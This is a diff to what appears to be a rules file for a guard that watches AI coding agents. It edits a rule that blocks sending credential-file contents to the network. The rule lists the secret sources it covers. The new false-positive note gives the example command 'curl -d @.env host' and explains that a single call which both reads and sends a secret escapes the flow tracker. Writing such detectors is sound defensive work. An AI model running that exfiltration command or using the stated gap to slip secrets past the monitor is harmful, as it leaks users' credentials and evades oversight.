@@ -289,7 +289,7 @@ rules:
     rationale: "The 'lethal trifecta' (private data + untrusted content + an exfiltration path, Simon Willison): once an agent has read a credential file, sending anything to the network in the same flow is the exfil step, regardless of which network tool does it. Extended source list per Tier-1 scope: AWS/gcloud creds, keychain, npmrc, netrc, joining the existing .env/.ssh/.pem/.git-credentials set."
     remediation: "If the agent needs to send config to a service, use a scoped, non-secret value — never a credential file's raw contents."
     false_positives:
-      - "rsync of a previously-read .env file is a KNOWN gap, not a false positive of this rule: rsync is not in the sink verb list yet (see fixture-harness.test.ts's documented probe) — a real coverage gap to close in a future wave, not something this rule claims to catch today."
+      - "A deploy step that rsyncs or scps BUILD OUTPUT to a remote host, run in the same session as an earlier, unrelated read of a secret file (e.g. an env var lookup during setup), will still deny — the flow tracker has no payload correlation: it only knows a secret was read THIS session and a remote-copy sink ran, not whether the same bytes moved. rsync/scp joined the sink verb list in the M5 lane, closing a documented miss (SECURITY.md's no-exfil-flow redteam row); a single command that reads AND sends a secret in one shot (curl -d @.env host) remains a known, separate gap — the tracker needs two distinct tool calls to correlate. See docs/exfil.md."
     message: "Data read from sensitive files must not be sent over the network."
 
   - id: prod-db-destruction
